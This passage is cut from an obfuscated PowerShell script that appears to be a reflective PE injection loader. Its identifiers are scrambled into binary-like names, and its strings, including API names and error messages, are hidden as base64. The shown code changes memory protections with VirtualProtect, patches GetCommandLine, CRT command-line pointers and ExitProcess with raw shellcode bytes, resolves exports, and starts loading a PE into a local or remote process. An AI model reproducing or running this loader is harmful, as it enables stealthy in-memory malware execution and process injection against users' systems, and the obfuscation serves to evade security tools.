      if ((${_01111001100100000} -band $Win32Constants.IMAGE_SCN_MEM_EXECUTE) -gt 0)
      {
        if ((${_01111001100100000} -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
        {
          if ((${_01111001100100000} -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
          {
            ${10100111111110110} = $Win32Constants.PAGE_EXECUTE_READWRITE
          }
          else
          {
            ${10100111111110110} = $Win32Constants.PAGE_EXECUTE_READ
          }
        }
        else
        {
          if ((${_01111001100100000} -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
          {
            ${10100111111110110} = $Win32Constants.PAGE_EXECUTE_WRITECOPY
          }
          else
          {
            ${10100111111110110} = $Win32Constants.PAGE_EXECUTE
          }
        }
      }
      else
      {
        if ((${_01111001100100000} -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
        {
          if ((${_01111001100100000} -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
          {
            ${10100111111110110} = $Win32Constants.PAGE_READWRITE
          }
          else
          {
            ${10100111111110110} = $Win32Constants.PAGE_READONLY
          }
        }
        else
        {
          if ((${_01111001100100000} -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
          {
            ${10100111111110110} = $Win32Constants.PAGE_WRITECOPY
          }
          else
          {
            ${10100111111110110} = $Win32Constants.PAGE_NOACCESS
          }
        }
      }
      if ((${_01111001100100000} -band $Win32Constants.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
      {
        ${10100111111110110} = ${10100111111110110} -bor $Win32Constants.PAGE_NOCACHE
      }
      return ${10100111111110110}
    }
    Function _00001000000111011
    {
      Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        ${_00001100001100000},
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants,
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Types
      )
      for( ${00111011010111001} = 0; ${00111011010111001} -lt ${_00001100001100000}.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; ${00111011010111001}++)
      {
        [IntPtr]${01100000000010011} = [IntPtr](_01000001001001111 ([Int64]${_00001100001100000}.SectionHeaderPtr) (${00111011010111001} * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
        ${10001011100011010} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${01100000000010011}, [Type]$Win32Types.IMAGE_SECTION_HEADER)
        [IntPtr]${00011111110000011} = _01000001001001111 (${_00001100001100000}.PEHandle) (${10001011100011010}.VirtualAddress)
        [UInt32]${01000010101110011} = _01011100101011101 ${10001011100011010}.Characteristics
        [UInt32]${10001010011001101} = ${10001011100011010}.VirtualSize
        [UInt32]${10010110000101100} = 0
        _00011010101001110 -_01100101100000011 $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBwAGQAYQB0AGUALQBNAGUAbQBvAHIAeQBQAHIAbwB0AGUAYwB0AGkAbwBuAEYAbABhAGcAcwA6ADoAVgBpAHIAdAB1AGEAbABQAHIAbwB0AGUAYwB0AA=='))) -_00001100001100000 ${_00001100001100000} -_01001010010000001 ${00011111110000011} -_00101100101110110 ${10001010011001101} | Out-Null
        ${10111100011001010} = $Win32Functions.VirtualProtect.Invoke(${00011111110000011}, ${10001010011001101}, ${01000010101110011}, [Ref]${10010110000101100})
        if (${10111100011001010} -eq $false)
        {
          Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABjAGgAYQBuAGcAZQAgAG0AZQBtAG8AcgB5ACAAcAByAG8AdABlAGMAdABpAG8AbgA=')))
        }
      }
    }
    Function _00100010111101011
    {
      Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        ${_00001100001100000},
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants,
        [Parameter(Position = 3, Mandatory = $true)]
        [String]
        ${_01111001011011101},
        [Parameter(Position = 4, Mandatory = $true)]
        [IntPtr]
        ${_01001011111001001}
      )
      ${01101110011001111} = @() 
      ${11000010010100101} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
      [UInt32]${10010110000101100} = 0
      [IntPtr]${01101110000011100} = $Win32Functions.GetModuleHandle.Invoke($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SwBlAHIAbgBlAGwAMwAyAC4AZABsAGwA'))))
      if (${01101110000011100} -eq [IntPtr]::Zero)
      {
        throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SwBlAHIAbgBlAGwAMwAyACAAaABhAG4AZABsAGUAIABuAHUAbABsAA==')))
      }
      [IntPtr]${00110110100001010} = $Win32Functions.GetModuleHandle.Invoke($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SwBlAHIAbgBlAGwAQgBhAHMAZQAuAGQAbABsAA=='))))
      if (${00110110100001010} -eq [IntPtr]::Zero)
      {
        throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SwBlAHIAbgBlAGwAQgBhAHMAZQAgAGgAYQBuAGQAbABlACAAbgB1AGwAbAA=')))
      }
      ${01011011111011111} = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni(${_01111001011011101})
      ${00010100101100100} = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi(${_01111001011011101})
      [IntPtr]${00110111011011110} = $Win32Functions.GetProcAddress.Invoke(${00110110100001010}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAQwBvAG0AbQBhAG4AZABMAGkAbgBlAEEA'))))
      [IntPtr]${10011110111101011} = $Win32Functions.GetProcAddress.Invoke(${00110110100001010}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAQwBvAG0AbQBhAG4AZABMAGkAbgBlAFcA'))))
      if (${00110111011011110} -eq [IntPtr]::Zero -or ${10011110111101011} -eq [IntPtr]::Zero)
      {
        throw "GetCommandLine ptr null. GetCommandLineA: $(_10110000010101001 ${00110111011011110}). GetCommandLineW: $(_10110000010101001 ${10011110111101011})"
      }
      [Byte[]]${10001110111011011} = @()
      if (${11000010010100101} -eq 8)
      {
        ${10001110111011011} += 0x48	
      }
      ${10001110111011011} += 0xb8
      [Byte[]]${00011000100110010} = @(0xc3)
      ${00000100000010000} = ${10001110111011011}.Length + ${11000010010100101} + ${00011000100110010}.Length
      ${01100101101100010} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${00000100000010000})
      ${01001001011100000} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${00000100000010000})
      $Win32Functions.memcpy.Invoke(${01100101101100010}, ${00110111011011110}, [UInt64]${00000100000010000}) | Out-Null
      $Win32Functions.memcpy.Invoke(${01001001011100000}, ${10011110111101011}, [UInt64]${00000100000010000}) | Out-Null
      ${01101110011001111} += ,(${00110111011011110}, ${01100101101100010}, ${00000100000010000})
      ${01101110011001111} += ,(${10011110111101011}, ${01001001011100000}, ${00000100000010000})
      [UInt32]${10010110000101100} = 0
      ${10111100011001010} = $Win32Functions.VirtualProtect.Invoke(${00110111011011110}, [UInt32]${00000100000010000}, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]${10010110000101100})
      if (${10111100011001010} = $false)
      {
        throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAgAGYAYQBpAGwAZQBkAA==')))
      }
      ${01001110001001011} = ${00110111011011110}
      _01000001010000001 -_00101001000101111 ${10001110111011011} -_00000110000010110 ${01001110001001011}
      ${01001110001001011} = _01000001001001111 ${01001110001001011} (${10001110111011011}.Length)
      [System.Runtime.InteropServices.Marshal]::StructureToPtr(${00010100101100100}, ${01001110001001011}, $false)
      ${01001110001001011} = _01000001001001111 ${01001110001001011} ${11000010010100101}
      _01000001010000001 -_00101001000101111 ${00011000100110010} -_00000110000010110 ${01001110001001011}
      $Win32Functions.VirtualProtect.Invoke(${00110111011011110}, [UInt32]${00000100000010000}, [UInt32]${10010110000101100}, [Ref]${10010110000101100}) | Out-Null
      [UInt32]${10010110000101100} = 0
      ${10111100011001010} = $Win32Functions.VirtualProtect.Invoke(${10011110111101011}, [UInt32]${00000100000010000}, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]${10010110000101100})
      if (${10111100011001010} = $false)
      {
        throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAgAGYAYQBpAGwAZQBkAA==')))
      }
      ${01100110001111011} = ${10011110111101011}
      _01000001010000001 -_00101001000101111 ${10001110111011011} -_00000110000010110 ${01100110001111011}
      ${01100110001111011} = _01000001001001111 ${01100110001111011} (${10001110111011011}.Length)
      [System.Runtime.InteropServices.Marshal]::StructureToPtr(${01011011111011111}, ${01100110001111011}, $false)
      ${01100110001111011} = _01000001001001111 ${01100110001111011} ${11000010010100101}
      _01000001010000001 -_00101001000101111 ${00011000100110010} -_00000110000010110 ${01100110001111011}
      $Win32Functions.VirtualProtect.Invoke(${10011110111101011}, [UInt32]${00000100000010000}, [UInt32]${10010110000101100}, [Ref]${10010110000101100}) | Out-Null
      ${00111100110001111} = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADcAMABkAC4AZABsAGwA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADcAMQBkAC4AZABsAGwA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADgAMABkAC4AZABsAGwA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADkAMABkAC4AZABsAGwA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADEAMAAwAGQALgBkAGwAbAA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADEAMQAwAGQALgBkAGwAbAA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADcAMAAuAGQAbABsAA=='))) `
      , $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADcAMQAuAGQAbABsAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADgAMAAuAGQAbABsAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADkAMAAuAGQAbABsAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADEAMAAwAC4AZABsAGwA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADEAMQAwAC4AZABsAGwA'))))
      foreach (${01100110101010001} in ${00111100110001111})
      {
        [IntPtr]${10001100010100000} = $Win32Functions.GetModuleHandle.Invoke(${01100110101010001})
        if (${10001100010100000} -ne [IntPtr]::Zero)
        {
          [IntPtr]${10011110100000110} = $Win32Functions.GetProcAddress.Invoke(${10001100010100000}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwB3AGMAbQBkAGwAbgA='))))
          [IntPtr]${01001111011010001} = $Win32Functions.GetProcAddress.Invoke(${10001100010100000}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBhAGMAbQBkAGwAbgA='))))
          if (${10011110100000110} -eq [IntPtr]::Zero -or ${01001111011010001} -eq [IntPtr]::Zero)
          {
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACwAIABjAG8AdQBsAGQAbgAnAHQAIABmAGkAbgBkACAAXwB3AGMAbQBkAGwAbgAgAG8AcgAgAF8AYQBjAG0AZABsAG4A')))
          }
          ${10101111100011101} = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi(${_01111001011011101})
          ${00110011111000001} = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni(${_01111001011011101})
          ${01000011101110111} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${01001111011010001}, [Type][IntPtr])
          ${10010101000011110} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${10011110100000110}, [Type][IntPtr])
          ${10110010011101101} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${11000010010100101})
          ${01100010111010110} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${11000010010100101})
          [System.Runtime.InteropServices.Marshal]::StructureToPtr(${01000011101110111}, ${10110010011101101}, $false)
          [System.Runtime.InteropServices.Marshal]::StructureToPtr(${10010101000011110}, ${01100010111010110}, $false)
          ${01101110011001111} += ,(${01001111011010001}, ${10110010011101101}, ${11000010010100101})
          ${01101110011001111} += ,(${10011110100000110}, ${01100010111010110}, ${11000010010100101})
          ${10111100011001010} = $Win32Functions.VirtualProtect.Invoke(${01001111011010001}, [UInt32]${11000010010100101}, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]${10010110000101100})
          if (${10111100011001010} = $false)
          {
            throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAgAGYAYQBpAGwAZQBkAA==')))
          }
          [System.Runtime.InteropServices.Marshal]::StructureToPtr(${10101111100011101}, ${01001111011010001}, $false)
          $Win32Functions.VirtualProtect.Invoke(${01001111011010001}, [UInt32]${11000010010100101}, [UInt32](${10010110000101100}), [Ref]${10010110000101100}) | Out-Null
          ${10111100011001010} = $Win32Functions.VirtualProtect.Invoke(${10011110100000110}, [UInt32]${11000010010100101}, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]${10010110000101100})
          if (${10111100011001010} = $false)
          {
            throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAgAGYAYQBpAGwAZQBkAA==')))
          }
          [System.Runtime.InteropServices.Marshal]::StructureToPtr(${00110011111000001}, ${10011110100000110}, $false)
          $Win32Functions.VirtualProtect.Invoke(${10011110100000110}, [UInt32]${11000010010100101}, [UInt32](${10010110000101100}), [Ref]${10010110000101100}) | Out-Null
        }
      }
      ${01101110011001111} = @()
      ${10110101110111100} = @() 
      [IntPtr]${01000001000001101} = $Win32Functions.GetModuleHandle.Invoke($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAGMAbwByAGUAZQAuAGQAbABsAA=='))))
      if (${01000001000001101} -eq [IntPtr]::Zero)
      {
        throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAGMAbwByAGUAZQAgAGgAYQBuAGQAbABlACAAbgB1AGwAbAA=')))
      }
      [IntPtr]${01100110101001100} = $Win32Functions.GetProcAddress.Invoke(${01000001000001101}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHIARQB4AGkAdABQAHIAbwBjAGUAcwBzAA=='))))
      if (${01100110101001100} -eq [IntPtr]::Zero)
      {
        Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHIARQB4AGkAdABQAHIAbwBjAGUAcwBzACAAYQBkAGQAcgBlAHMAcwAgAG4AbwB0ACAAZgBvAHUAbgBkAA==')))
      }
      ${10110101110111100} += ${01100110101001100}
      [IntPtr]${01010110101011010} = $Win32Functions.GetProcAddress.Invoke(${01101110000011100}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdABQAHIAbwBjAGUAcwBzAA=='))))
      if (${01010110101011010} -eq [IntPtr]::Zero)
      {
        Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdABQAHIAbwBjAGUAcwBzACAAYQBkAGQAcgBlAHMAcwAgAG4AbwB0ACAAZgBvAHUAbgBkAA==')))
      }
      ${10110101110111100} += ${01010110101011010}
      [UInt32]${10010110000101100} = 0
      foreach (${00001101001111111} in ${10110101110111100})
      {
        ${01111101110010110} = ${00001101001111111}
        [Byte[]]${10001110111011011} = @(0xbb)
        [Byte[]]${00011000100110010} = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
        if (${11000010010100101} -eq 8)
        {
          [Byte[]]${10001110111011011} = @(0x48, 0xbb)
          [Byte[]]${00011000100110010} = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
        }
        [Byte[]]${00000100111011111} = @(0xff, 0xd3)
        ${00000100000010000} = ${10001110111011011}.Length + ${11000010010100101} + ${00011000100110010}.Length + ${11000010010100101} + ${00000100111011111}.Length
        [IntPtr]${10110001001001010} = $Win32Functions.GetProcAddress.Invoke(${01101110000011100}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdABUAGgAcgBlAGEAZAA='))))
        if (${10110001001001010} -eq [IntPtr]::Zero)
        {
          Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdABUAGgAcgBlAGEAZAAgAGEAZABkAHIAZQBzAHMAIABuAG8AdAAgAGYAbwB1AG4AZAA=')))
        }
        ${10111100011001010} = $Win32Functions.VirtualProtect.Invoke(${00001101001111111}, [UInt32]${00000100000010000}, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]${10010110000101100})
        if (${10111100011001010} -eq $false)
        {
          Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAgAGYAYQBpAGwAZQBkAA==')))
        }
        ${01110100011011101} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${00000100000010000})
        $Win32Functions.memcpy.Invoke(${01110100011011101}, ${00001101001111111}, [UInt64]${00000100000010000}) | Out-Null
        ${01101110011001111} += ,(${00001101001111111}, ${01110100011011101}, ${00000100000010000})
        _01000001010000001 -_00101001000101111 ${10001110111011011} -_00000110000010110 ${01111101110010110}
        ${01111101110010110} = _01000001001001111 ${01111101110010110} (${10001110111011011}.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr(${_01001011111001001}, ${01111101110010110}, $false)
        ${01111101110010110} = _01000001001001111 ${01111101110010110} ${11000010010100101}
        _01000001010000001 -_00101001000101111 ${00011000100110010} -_00000110000010110 ${01111101110010110}
        ${01111101110010110} = _01000001001001111 ${01111101110010110} (${00011000100110010}.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr(${10110001001001010}, ${01111101110010110}, $false)
        ${01111101110010110} = _01000001001001111 ${01111101110010110} ${11000010010100101}
        _01000001010000001 -_00101001000101111 ${00000100111011111} -_00000110000010110 ${01111101110010110}
        $Win32Functions.VirtualProtect.Invoke(${00001101001111111}, [UInt32]${00000100000010000}, [UInt32]${10010110000101100}, [Ref]${10010110000101100}) | Out-Null
      }
      echo ${01101110011001111}
    }
    Function _00010100011100100
    {
      Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Array[]]
        ${_01011011100010110},
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants
      )
      [UInt32]${10010110000101100} = 0
      foreach (${10001001101010100} in ${_01011011100010110})
      {
        ${10111100011001010} = $Win32Functions.VirtualProtect.Invoke(${10001001101010100}[0], [UInt32]${10001001101010100}[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]${10010110000101100})
        if (${10111100011001010} -eq $false)
        {
          Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAgAGYAYQBpAGwAZQBkAA==')))
        }
        $Win32Functions.memcpy.Invoke(${10001001101010100}[0], ${10001001101010100}[1], [UInt64]${10001001101010100}[2]) | Out-Null
        $Win32Functions.VirtualProtect.Invoke(${10001001101010100}[0], [UInt32]${10001001101010100}[2], [UInt32]${10010110000101100}, [Ref]${10010110000101100}) | Out-Null
      }
    }
    Function _00111110101010000
    {
      Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [IntPtr]
        ${_10101011101010101},
        [Parameter(Position = 1, Mandatory = $true)]
        [String]
        ${_01100000000001000}
      )
      $Win32Types = _10101011001010101
      $Win32Constants = _01001001010010001
      ${_00001100001100000} = _00010110110001110 -_10101011101010101 ${_10101011101010101} -Win32Types $Win32Types -Win32Constants $Win32Constants
      if (${_00001100001100000}.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
      {
        return [IntPtr]::Zero
      }
      ${10100011010111000} = _01000001001001111 (${_10101011101010101}) (${_00001100001100000}.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
      ${10011111100011011} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${10100011010111000}, [Type]$Win32Types.IMAGE_EXPORT_DIRECTORY)
      for (${00111011010111001} = 0; ${00111011010111001} -lt ${10011111100011011}.NumberOfNames; ${00111011010111001}++)
      {
        ${01000100101111101} = _01000001001001111 (${_10101011101010101}) (${10011111100011011}.AddressOfNames + (${00111011010111001} * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
        ${10000100101100010} = _01000001001001111 (${_10101011101010101}) ([System.Runtime.InteropServices.Marshal]::PtrToStructure(${01000100101111101}, [Type][UInt32]))
        ${01001010011110111} = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi(${10000100101100010})
        if (${01001010011110111} -ceq ${_01100000000001000})
        {
          ${01001100110110101} = _01000001001001111 (${_10101011101010101}) (${10011111100011011}.AddressOfNameOrdinals + (${00111011010111001} * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
          ${01110010000000010} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${01001100110110101}, [Type][UInt16])
          ${10000100001000101} = _01000001001001111 (${_10101011101010101}) (${10011111100011011}.AddressOfFunctions + (${01110010000000010} * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
          ${00111101100111011} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${10000100001000101}, [Type][UInt32])
          return _01000001001001111 (${_10101011101010101}) (${00111101100111011})
        }
      }
      return [IntPtr]::Zero
    }
    Function _10100010011101110
    {
      Param(
        [Parameter( Position = 0, Mandatory = $true )]
        [Byte[]]
        ${_00110111011010011},
        [Parameter(Position = 1, Mandatory = $false)]
        [String]
        ${_00000011111101000},
        [Parameter(Position = 2, Mandatory = $false)]
        [IntPtr]
        ${_01000110101000100},
        [Parameter(Position = 3)]
        [Bool]
        ${_01011101011011001} = $false
      )
      ${11000010010100101} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
      $Win32Constants = _01001001010010001
      $Win32Functions = _00011011001110100
      $Win32Types = _10101011001010101
      ${01100001000010111} = $false
      if ((${_01000110101000100} -ne $null) -and (${_01000110101000100} -ne [IntPtr]::Zero))
      {
        ${01100001000010111} = $true
      }
      Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAdABpAG4AZwAgAGIAYQBzAGkAYwAgAFAARQAgAGkAbgBmAG8AcgBtAGEAdABpAG8AbgAgAGYAcgBvAG0AIAB0AGgAZQAgAGYAaQBsAGUA')))
      ${_00001100001100000} = _01000100100011000 -_00110111011010011 ${_00110111011010011} -Win32Types $Win32Types
      ${_01010111111011000} = ${_00001100001100000}.OriginalImageBase
      ${01101011111000011} = $true
      if (([Int] ${_00001100001100000}.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
      {
        Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAaQBzACAAbgBvAHQAIABjAG8AbQBwAGEAdABpAGIAbABlACAAdwBpAHQAaAAgAEQARQBQACwAIABtAGkAZwBoAHQAIABjAGEAdQBzAGUAIABpAHMAcwB1AGUAcwA='))) -WarningAction Continue
        ${01101011111000011} = $false
      }
      ${10111111000010101} = $true
      if (${01100001000010111} -eq $true)
      {
        ${01101110000011100} = $Win32Functions.GetModuleHandle.Invoke($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('awBlAHIAbgBlAGwAMwAyAC4AZABsAGwA'))))
        ${10101110001001011} = $Win32Functions.GetProcAddress.Invoke(${01101110000011100}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAFcAbwB3ADYANABQAHIAbwBjAGUAcwBzAA=='))))
        if (${10101110001001011} -eq [IntPtr]::Zero)
        {
          Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHUAbABkAG4AJwB0ACAAbABvAGMAYQB0AGUAIABJAHMAVwBvAHcANgA0AFAAcgBvAGMAZQBzAHMAIABmAHUAbgBjAHQAaQBvAG4AIAB0AG8AIABkAGUAdABlAHIAbQBpAG4AZQAgAGkAZgAgAHQAYQByAGcAZQB0ACAAcAByAG8AYwBlAHMAcwAgAGkAcwAgADMAMgBiAGkAdAAgAG8AcgAgADYANABiAGkAdAA=')))
        }
        [Bool]${10000010011011001} = $false
        ${10111100011001010} = $Win32Functions.IsWow64Process.Invoke(${_01000110101000100}, [Ref]${10000010011011001})
        if (${10111100011001010} -eq $false)
        {
          Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAEkAcwBXAG8AdwA2ADQAUAByAG8AYwBlAHMAcwAgAGYAYQBpAGwAZQBkAA==')))
        }
        if ((${10000010011011001} -eq $true) -or ((${10000010011011001} -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
        {
          ${10111111000010101} = $false
        }
        ${00011001010101111} = $true
        if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
        {
          ${00011001010101111} = $false
        }
        if (${00011001010101111} -ne ${10111111000010101})
        {
          throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFMAaABlAGwAbAAgAG0AdQBzAHQAIABiAGUAIABzAGEAbQBlACAAYQByAGMAaABpAHQAZQBjAHQAdQByAGUAIAAoAHgAOAA2AC8AeAA2ADQAKQAgAGEAcwAgAFAARQAgAGIAZQBpAG4AZwAgAGwAbwBhAGQAZQBkACAAYQBuAGQAIAByAGUAbQBvAHQAZQAgAHAAcgBvAGMAZQBzAHMA')))
        }
      }
      else
      {
        if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
        {
          ${10111111000010101} = $false
        }
      }
      if (${10111111000010101} -ne ${_00001100001100000}.PE64Bit)
      {
        Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAcABsAGEAdABmAG8AcgBtACAAZABvAGUAcwBuACcAdAAgAG0AYQB0AGMAaAAgAHQAaABlACAAYQByAGMAaABpAHQAZQBjAHQAdQByAGUAIABvAGYAIAB0AGgAZQAgAHAAcgBvAGMAZQBzAHMAIABpAHQAIABpAHMAIABiAGUAaQBuAGcAIABsAG8AYQBkAGUAZAAgAGkAbgAgACgAMwAyAC8ANgA0AGIAaQB0ACkA')))
      }
      Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwAbwBjAGEAdABpAG4AZwAgAG0AZQBtAG8AcgB5ACAAZgBvAHIAIAB0AGgAZQAgAFAARQAgAGEAbgBkACAAdwByAGkAdABlACAAaQB0AHMAIABoAGUAYQBkAGUAcgBzACAAdABvACAAbQBlAG0AbwByAHkA')))
      [IntPtr]${00100010010011000} = [IntPtr]::Zero
        ${01110000001001000} = ([Int] ${_00001100001100000}.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -eq $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE
      if ((-not ${_01011101011011001}) -and (-not ${01110000001001000}))
      {
        Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAZgBpAGwAZQAgAGIAZQBpAG4AZwAgAHIAZQBmAGwAZQBjAHQAaQB2AGUAbAB5ACAAbABvAGEAZABlAGQAIABpAHMAIABuAG8AdAAgAEEAUwBMAFIAIABjAG8AbQBwAGEAdABpAGIAbABlAC4AIABJAGYAIAB0AGgAZQAgAGwAbwBhAGQAaQBuAGcAIABmAGEAaQBsAHMALAAgAHQAcgB5ACAAcgBlAHMAdABhAHIAdABpAG4AZwAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIABhAG4AZAAgAHQAcgB5AGkAbgBnACAAYQBnAGEAaQBuACAATwBSACAAdAByAHkAIAB1AHMAaQBuAGcAIAB0AGgAZQAgAC0ARgBvAHIAYwBlAEEAUwBMAFIAIABmAGwAYQBnACAAKABjAG8AdQBsAGQAIABjAGEAdQBzAGUAIABjAHIAYQBzAGgAZQBzACkA'))) -WarningAction Continue
        [IntPtr]${00100010010011000} = ${_01010111111011000}
      }
        elseif (${_01011101011011001} -and (-not ${01110000001001000}))
        {
